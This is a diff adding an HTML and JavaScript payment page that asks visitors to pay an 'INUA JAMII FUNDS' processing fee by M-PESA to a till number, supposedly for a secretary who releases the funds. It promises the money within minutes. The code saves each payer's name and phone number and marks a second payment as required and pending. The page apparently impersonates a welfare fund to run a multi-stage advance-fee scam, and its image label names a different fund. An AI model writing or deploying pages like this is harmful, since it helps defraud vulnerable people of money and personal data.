@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Payment – Processing Fee</title>
+<link rel="stylesheet" href="style.css" />
+
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
+<script src="firebase-config.js"></script>
+
+<style>
+/* Optional: You can add some smooth transition for messages */
+#copyMessage, #alertMessage {
+  transition: opacity 0.3s;
+}
+</style>
+</head>
+<body>
+
+<div class="container" style="position: relative;">
+
+  <!-- Message for copy confirmation -->
+  <div id="copyMessage" style="
+    position: absolute;
+    display: none;
+    background: #fffae6;
+    padding: 5px 10px;
+    border: 1px solid #ccc;
+    border-radius: 4px;
+    font-size: 14px;
+    z-index: 1000;
+  "></div>
+
+  <!-- Alert message above input fields -->
+  <div id="alertMessage" style="
+    position: absolute;
+    display: none;
+    background: #ffe6e6;
+    padding: 5px 10px;
+    border: 1px solid #f00;
+    border-radius: 4px;
+    font-size: 14px;
+    z-index: 1000;
+  "></div>
+
+  <h2>MPESA PAYMENT INSTRUCTION</h2>
+  <p>Please follow the steps below to pay your INUA JAMII FUNDS processing fee directly to our secretary Damaris in charge of approving and releasing funds:</p>
+
+  <p style="font-size:20px; font-weight:bold;">Fee Amount: <strong>Ksh <span id="fees2value">---</span></strong></p>
+
+  <ol style="font-size:18px;">
+    <li>Go to <strong>MPESA</strong></li>
+    <li>Select <strong>Lipa na MPESA</strong></li>
+    <li>Select <strong>Buy Goods And Services</strong></li>
+    <li>Enter Til Number: <strong id="tillNumber">3230727</strong>
+        <button onclick="copyTill()" style="margin-left:10px;">Copy Till Number</button>
+    </li>
+    <li>Enter the fee amount</li>
+    <li>Confirm and enter your MPESA PIN</li>
+  </ol>
+
+  <img src="till_phpto.jpg" alt="NYOTA FUND MPESA TILL" style="width:220px; margin-top:10px;">
+  <h2>INUA JAMII PAYMENTS
+🇰🇪 INUA JAMII FOUNDATION – Trusted & Reliable 🇰🇪</h2>
+
+  <h3>Payment Confirmation</h3>
+  <p>After successful payment, your INUA JAMII FUNDS will be sent to your phone in less than 3 minutes make sure you complete all steps.</p>
+  <form id="payment1Form">
+    <input type="text" id="senderName" placeholder="Sender Name" required>
+    <input type="text" id="senderPhone" placeholder="Phone Number" required>
+    <button type="submit">Submit Payment</button>
+  </form>
+</div>
+
+<script>
+const userPhone = localStorage.getItem("userPhone");
+if (!userPhone) window.location.href = "amount.html";
+
+// Retrieve 'fees2' from URL parameters immediately
+const urlParams = new URLSearchParams(window.location.search);
+const fees2 = urlParams.get("fees2");
+
+// Set the fees2 value in the span as soon as possible
+if (fees2) {
+  document.getElementById("fees2value").innerText = fees2;
+} else {
+  document.getElementById("fees2value").innerText = "N/A";
+}
+
+// Copy Till Number
+function copyTill() {
+  const till = document.getElementById("tillNumber").innerText;
+  const copyMsg = document.getElementById("copyMessage");
+  const btn = document.querySelector("button[onclick='copyTill()']");
+  const rect = btn.getBoundingClientRect();
+
+  navigator.clipboard.writeText(till).then(() => {
+    // Show message slightly above the button
+    copyMsg.innerText = "Copied!";
+    copyMsg.style.left = `${rect.left + window.scrollX}px`;
+    copyMsg.style.top = `${rect.top + window.scrollY - 30}px`; // 30px above
+    copyMsg.style.display = "block";
+
+    // Fade out after 2 seconds
+    setTimeout(() => {
+      copyMsg.style.display = "none";
+    }, 2000);
+  }).catch(err => {
+    alert("Failed to copy, copy manually.");
+  });
+}
+
+// Form submission with alert above input
+document.getElementById("payment1Form").addEventListener("submit", function(e) {
+  e.preventDefault();
+
+  const senderName = document.getElementById("senderName").value.trim();
+  const senderPhone = document.getElementById("senderPhone").value.trim();
+  const alertMsgDiv = document.getElementById("alertMessage");
+
+  if (senderName.length < 2 || senderPhone.length < 10) {
+    // Show alert slightly above the name input
+    const nameInputRect = document.getElementById("senderName").getBoundingClientRect();
+
+    alertMsgDiv.innerText = "Enter valid name and phone";
+    alertMsgDiv.style.left = `${nameInputRect.left + window.scrollX}px`;
+    alertMsgDiv.style.top = `${nameInputRect.top + window.scrollY - 30}px`; // 30px above
+    alertMsgDiv.style.display = "block";
+
+    // Hide after 2 seconds
+    setTimeout(() => {
+      alertMsgDiv.style.display = "none";
+    }, 2000);
+
+    return;
+  }
+
+  // Save data including the fees2 value
+  db.collection("users").doc(userPhone).update({
+    firstPayment: {
+      amount: fees2, // use the retrieved value here
+      senderName,
+      senderPhone,
+      confirmedAt: new Date()
+    },
+    secondPayment: {
+      required: true,
+      status: "pending"
+    }
+  }).then(() => {
+    // Redirect or perform other actions as needed
+    window.location.href = "payment1.html"; // replace with actual next page if necessary
+  }).catch(err => {
+    alert("Error submitting payment. Try again.");
+    console.error(err);
+  });
+});
+</script>
+
+</body>
+</html>
